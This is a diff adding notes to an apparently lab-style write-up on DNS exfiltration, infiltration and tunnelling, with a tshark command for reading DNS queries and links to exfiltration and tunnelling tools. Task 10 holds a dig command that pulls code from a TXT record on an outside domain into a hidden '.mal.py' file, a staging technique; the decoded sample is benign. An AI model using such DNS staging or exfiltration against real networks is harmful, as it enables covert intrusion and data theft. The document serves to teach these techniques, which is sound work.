@@ -26,3 +26,53 @@ Resources
 
 # Task 5 - What is DNS Exfiltration?
 DNS Exfiltration is a cyberattack via DNS with manual and automatted attacks.  Data exfiltration through DNS allows an attacker to transfer a large volume of data that looks like normal DNS traffic.
+
+# Task 6 - DNS Exfiltration - Demo
+Demo resources
+* https://github.com/kleosdc/dns-exfil-infil/blob/main/securecorp.txt
+* https://github.com/kleosdc/dns-exfil-infil/blob/main/packety.py
+* https://github.com/kleosdc/dns-exfil-infil/blob/main/packetyGrabber.py
+
+# Task 7 - DNS Exfiltration - Practice
+SSH to the practice VM and run the commands
+
+tshark
+```
+tshark -r [filename].pcap -T fields -e dns.qry.name
+```
+
+# Task 8 - What is DNS Infiltration
+Infiltration defines the process where malicious code is ran to manipulate DNS servers, primarily used for dropping or malware staging, TXT records are usually used to infiltrate data into a network
+
+# Task 9 - DNS Infiltration - Demo
+Resources
+* https://github.com/kleosdc/dns-exfil-infil
+
+# Task 10 - DNS Infiltration - Practice
+SSH to the practice VM and run the commands
+
+grab TXT record
+```
+dig +short code.badbaddoma.in TXT | sed -e 's/\"//g' > .mal.py
+```
+run decoder
+```
+python3 ~/dns-exfil-infil/packetySimple.py
+```
+cat decoded output
+```
+cat .mal.py
+import os; print(os.uname()[2])
+```
+grab flag
+```
+python -c 'import os; print(os.uname()[2])'
+```
+
+# Task 11 - DNS Tunneling
+DNS is rarely monitored and can be used to tunnel other traffic
+
+Tools
+* https://code.kryo.se/iodine/
+
+# Task 12 - End
